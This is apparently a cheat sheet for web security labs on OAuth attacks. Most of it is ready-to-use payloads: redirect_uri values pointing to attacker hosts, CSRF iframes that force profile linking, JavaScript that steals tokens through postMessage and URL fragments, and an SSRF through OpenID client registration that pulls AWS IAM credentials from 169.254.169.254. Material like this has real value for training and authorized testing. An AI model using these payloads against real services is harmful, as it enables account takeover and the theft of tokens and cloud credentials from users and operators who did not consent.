# OAuth Authentication - Quick-Start Guide

## OAuth Attack Quick Reference

| Attack | Time | Key Technique |
|--------|------|---------------|
| Implicit Flow Bypass | 5 min | Parameter manipulation |
| Forced Profile Linking (CSRF) | 10 min | Missing state parameter |
| redirect_uri Hijacking | 5 min | redirect_uri validation bypass |
| Proxy Page Token Theft | 15 min | Directory traversal + postMessage |
| Open Redirect Token Theft | 15 min | Chained vulnerabilities |
| SSRF via Client Registration | 10 min | OpenID dynamic registration SSRF |

---

## 5-Minute OAuth Vulnerability Check

### Quick Win Checklist

**1. Missing state Parameter (2 minutes)**
```http
# Check authorization request
GET /auth?client_id=...&redirect_uri=...&response_type=code

# If no &state= parameter → CSRF vulnerability!
```

**2. redirect_uri Validation (2 minutes)**
```http
# Test in Burp Repeater
GET /auth?...&redirect_uri=https://attacker.com

# If redirect works → Critical vulnerability
```

**3. Implicit Flow Misuse (1 minute)**
```http
# Check for tokens in URL
https://app.com/callback#access_token=...

# If present → Prefer authorization code flow
```

---

## Emergency Cheat Sheet

### Common OAuth Endpoints

```
# OpenID Discovery
GET /.well-known/openid-configuration

# Authorization
GET /auth?client_id=ID&redirect_uri=URI&response_type=code&scope=openid

# Token Exchange (Code Flow)
POST /token
code=AUTH_CODE&client_id=ID&client_secret=SECRET&redirect_uri=URI

# User Info
GET /userinfo
Authorization: Bearer ACCESS_TOKEN

# Alternative User Endpoint
GET /me
Authorization: Bearer ACCESS_TOKEN

# Client Registration (OpenID)
POST /reg
Content-Type: application/json
{"redirect_uris":["https://example.com"]}
```

### Burp Suite Shortcuts

```
# Send to Repeater
Ctrl/Cmd + R

# Send to Intruder
Ctrl/Cmd + I

# URL Decode
Ctrl/Cmd + Shift + U

# Base64 Decode
Burp Decoder → Select text → Smart decode

# Request in Browser
Right-click request → Request in browser → In original session
```

### Parameter Manipulation Quick Tests

```http
# Test 1: redirect_uri bypass
&redirect_uri=https://attacker.com

# Test 2: Directory traversal
&redirect_uri=https://victim.com/callback/../evil

# Test 3: Open redirect chain
&redirect_uri=https://victim.com/redirect?url=https://attacker.com

# Test 4: Remove state parameter
DELETE &state=... from authorization request

# Test 5: Scope escalation
&scope=admin+delete_users

# Test 6: Email manipulation
{"email":"victim@example.com","token":"attacker_token"}
```

### Token Extraction Patterns

**Pattern 1: postMessage Leak**
```javascript
window.addEventListener('message', function(e) {
    fetch("/?leak=" + encodeURIComponent(e.data.data))
})
```

**Pattern 2: URL Fragment Extraction**
```javascript
if (window.location.hash) {
    window.location = '/?token=' + window.location.hash.substring(1)
}
```

**Pattern 3: Iframe Trigger**
```html
<iframe src="OAUTH_AUTHORIZATION_URL_HERE"></iframe>
```

### AWS Metadata SSRF Targets

```bash
# IAM Role List
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IAM Credentials (replace ROLE with actual role name)
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role/

# Instance Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data
```

### One-Liner Attack Patterns

**Implicit Flow Parameter Manipulation:**
```
POST /authenticate → Change email to victim@example.com → Keep original token → Send request
```

**CSRF Profile Linking:**
```
Intercept /oauth-linking?code=X → Drop request → Create <iframe src="...?code=X"> → Deliver to victim
```

**redirect_uri Hijacking:**
```
Test redirect_uri=attacker-server in Repeater → Create iframe → Deliver → Use stolen code in /oauth-callback?code=X
```

**Token Theft via postMessage:**
```
redirect_uri=.../callback/../comment-form → Add postMessage listener → Deliver → Decode logs → Use token on /me
```

**Token Theft via Open Redirect:**
```
redirect_uri=.../callback/../redirect?path=attacker.net → Fragment extractor JS → Deliver → Use token
```

**SSRF via Client Registration:**
```
POST /reg → logo_uri=169.254.169.254/meta-data/iam/... → GET /client/ID/logo → Extract SecretAccessKey
```

---

## Quick Reference Card

### Common OAuth Endpoints
```
/.well-known/openid-configuration
/auth?client_id=...
/oauth-callback
/token
/me or /userinfo
/reg (client registration)
/client/ID/logo
```

### Essential Headers
```
Content-Type: application/json
Authorization: Bearer TOKEN
```

### Must-Remember Parameters
```
client_id=...
redirect_uri=...
response_type=code (or token)
scope=openid profile email
state=RANDOM (CSRF protection)
nonce=RANDOM (replay protection)
```
